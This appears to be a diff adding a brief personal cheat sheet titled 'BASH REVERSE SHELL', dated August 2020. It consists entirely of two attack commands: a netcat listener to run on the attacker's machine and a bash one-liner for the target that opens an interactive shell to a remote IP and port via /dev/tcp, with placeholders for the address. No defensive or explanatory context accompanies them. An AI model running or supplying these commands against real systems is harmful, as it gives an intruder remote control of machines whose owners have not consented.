@@ -1,0 +1,14 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  BASH REVERSE SHELL
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-08-04[Aug-Tue]10-11AM 
+
+NC LISTENER ON SOURCE BOX
+
+nc -lvnp 9001
+
+REVERSE SHELL ON TARGET
+
+bash -i >& /dev/tcp/ip/port 0>&1
